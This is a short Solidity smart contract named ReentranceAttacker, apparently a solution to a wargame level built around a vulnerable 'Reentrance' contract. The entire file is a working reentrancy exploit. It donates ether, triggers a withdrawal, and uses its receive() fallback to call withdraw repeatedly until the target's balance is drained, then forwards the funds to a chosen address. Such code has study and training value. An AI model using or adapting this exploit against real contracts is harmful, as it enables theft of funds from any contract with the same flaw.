// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttacker {
    Reentrance public reentrance;
    bool public failed;

    constructor (Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function reentranceWithdraw() public {
        reentrance.withdraw(0);
    }

    function reentranceDonate(address _to) public payable {
        (bool succeeded,) = address(reentrance).call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", _to)
        );

        if (!succeeded) {
            failed = true;
        }
    }

    function withdraw(address payable _to) public {
        _to.transfer(address(this).balance);
    }

    receive() external payable {
        uint256 attackerBalance = reentrance.balanceOf(address(this));

        if (address(reentrance).balance > 0) {
            reentrance.withdraw(attackerBalance);
        }
    }
}
